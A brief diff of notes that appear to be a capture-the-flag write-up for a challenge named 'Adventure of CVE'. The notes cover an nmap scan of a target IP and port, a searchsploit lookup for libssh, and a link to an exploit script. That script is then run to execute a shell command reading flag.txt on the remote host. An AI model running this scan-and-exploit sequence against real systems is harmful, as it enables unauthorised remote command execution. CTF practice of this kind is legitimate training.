@@ -1,0 +1,6 @@
+"Welcome to the magical world of Adventure of CVE. Explore as much as you can this land of services"
+it seems like the page isn't working at all but we can try scanning it with nmap to check the problem
+nmap -sV -sC -p 31367 34.141.12.127 -Pn
+searchsploit libssh
+https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
+python3 libssh.py 34.141.12.127 -p 31367 -c "cd ..; cat flag.txt"
